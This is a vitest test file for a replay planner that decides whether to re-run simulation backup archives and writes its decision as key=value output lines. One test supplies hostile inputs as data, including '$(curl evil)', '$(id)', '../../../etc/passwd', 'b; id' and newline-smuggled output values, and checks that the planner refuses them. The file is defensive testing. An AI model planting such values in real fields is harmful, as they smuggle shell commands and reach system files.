import { describe, expect, it } from "vitest";
import { planOutputs, planReplay } from "./replayPlan";

const me = "a".repeat(64);
const release = "f".repeat(40);
const archive = "bethesda-life-20261102T061753Z-62bd12502c17.tar.gz";
const older = "bethesda-life-20261102T001753Z-62bd12502c17.tar.gz";

const kept = (o: object = {}) => ({
  utc: "2026-11-02T06:17:53Z",
  archive,
  sha256: "b".repeat(64),
  bytes: 23233452,
  individual: me,
  checkpoint: 1923,
  tick: 5750241,
  release,
  digest: "c".repeat(64),
  committed: "2026-11-02T06:18:29.973Z",
  ...o,
});
const backup = (k: object | null = kept()) => ({
  schema: "bethesda-life-backup/v1",
  attempt: {
    utc: "2026-11-02T06:17:53Z",
    result: "kept",
    detail: null,
    offsite: "uploaded",
  },
  kept: k,
  offsite: null,
});
const line = (o: object = {}) =>
  JSON.stringify({
    passed: true,
    individual: me,
    archive: older,
    sha256: "d".repeat(64),
    release,
    to: { sequence: 1850, tick: 5530000, digest: "e".repeat(64) },
    ...o,
  });
const plan = (b: unknown, replays = "", maxCheckpoints = 300) =>
  planReplay({ backup: b, individual: me, replays, maxCheckpoints });

describe("planning a replay from what the VM says", () => {
  it("replays the newest archive when there is no verdict yet", () => {
    expect(plan(backup())).toEqual({
      action: "replay",
      archive,
      sha256: "b".repeat(64),
      release,
      previous: null,
    });
  });

  it("continues from the last replay when it passed, on the same release, nearby", () => {
    const p = plan(backup(), line());
    expect(p).toMatchObject({
      action: "replay",
      previous: { archive: older, sha256: "d".repeat(64) },
    });
  });

  it("starts again after a failure, a new release, a long absence or a rewind", () => {
    const fresh = { action: "replay", previous: null };
    expect(plan(backup(), line({ passed: false }))).toMatchObject(fresh);
    expect(plan(backup(), line({ release: "0".repeat(40) }))).toMatchObject(fresh);
    expect(plan(backup(), line(), 50)).toMatchObject(fresh);
    expect(
      plan(backup(), line({ to: { sequence: 2000, digest: "e".repeat(64) } })),
    ).toMatchObject(fresh);
  });

  it("judges an archive once, whichever way it went, so a skipped backup does not re-run it", () => {
    expect(plan(backup(), line({ archive })).action).toBe("wait");
    expect(plan(backup(), line({ archive, passed: false })).action).toBe("wait");
  });

  it("waits when the newest archive holds nothing newer, as when the fly has stopped", () => {
    const same = line({ to: { sequence: 1923, digest: "c".repeat(64) } });
    expect(plan(backup(), same).action).toBe("wait");
  });

  it("waits when there is nothing yet", () => {
    expect(plan(null).action).toBe("wait");
    expect(plan(backup(null)).action).toBe("wait");
  });

  it("ignores lines it cannot read and other individuals' verdicts", () => {
    const p = plan(backup(), `{not json\n${line({ individual: "9".repeat(64) })}\n`);
    expect(p).toMatchObject({ action: "replay", previous: null });
  });

  it("refuses a record that tries to reach the shell, and lets none of it out", () => {
    const attacks = [
      { checkpoint: "a[$(curl evil)]" },
      { archive: "x$(id).tar.gz" },
      { archive: `${archive}\nrelease=${release}` },
      { archive: "../../../etc/passwd" },
      { sha256: "b; id" },
      { release: "main" },
      { release: `${release}\nprevious=evil` },
    ];
    for (const attack of attacks) {
      const p = plan(backup(kept(attack)));
      expect(p.action, JSON.stringify(attack)).toBe("refuse");
      expect(planOutputs(p)).toEqual(["action=refuse"]);
    }
    expect(plan({ nonsense: true }).action).toBe("refuse");
  });

  it("continues only from an archive and checksum that are well formed", () => {
    expect(plan(backup(), line({ archive: "$(id).tar.gz" }))).toMatchObject({
      previous: null,
    });
    expect(plan(backup(), line({ sha256: "nope" }))).toMatchObject({ previous: null });
    expect(plan(backup(), line({ to: { sequence: "$((1))" } }))).toMatchObject({
      previous: null,
    });
  });

  it("writes one line per output, none of which can add another", () => {
    const out = planOutputs(plan(backup(), line()));
    expect(out).toEqual([
      "action=replay",
      `archive=${archive}`,
      `sha256=${"b".repeat(64)}`,
      `release=${release}`,
      `previous=${older}`,
      `previous_sha256=${"d".repeat(64)}`,
    ]);
    for (const l of out) expect(l).toMatch(/^[a-z_0-9]+=[\w.-]*$/);
  });
});
